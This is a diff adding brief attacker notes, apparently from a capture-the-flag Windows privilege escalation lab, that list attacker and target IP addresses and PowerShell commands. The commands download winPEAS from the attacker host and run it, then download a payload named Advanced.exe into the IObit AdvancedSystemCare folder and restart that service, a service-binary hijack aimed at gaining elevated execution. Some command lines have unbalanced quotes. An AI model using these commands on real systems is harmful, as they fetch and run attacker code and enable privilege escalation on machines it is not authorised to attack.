@@ -1,0 +1,12 @@
+attacker : 10.18.115.106
+target : 10.10.5.47
+
+powershell -c "Invoke-Webrequest -URI http://10.18.115.106/winPEAS.exe -OutFile C:\Users\bill\Desktop\winPEAS.exe
+powershell -c "Invoke-Webrequest -URI http://10.18.115.106/winPEAS.bat -OutFile C:\Users\bill\Desktop\winPEAS.bat
+
+powershell -c ". .\winPEAS.exe"
+powershell -c ". .\winPEAS.bat"
+
+powershell -c "Invoke-Webrequest -URI http://10.18.115.106/Advanced.exe -OutFile 'C:\Program Files (x86)\IObit\Advanced.exe'"
+powershell -c "Restart-Service -Name AdvancedSystemCareService9"
+
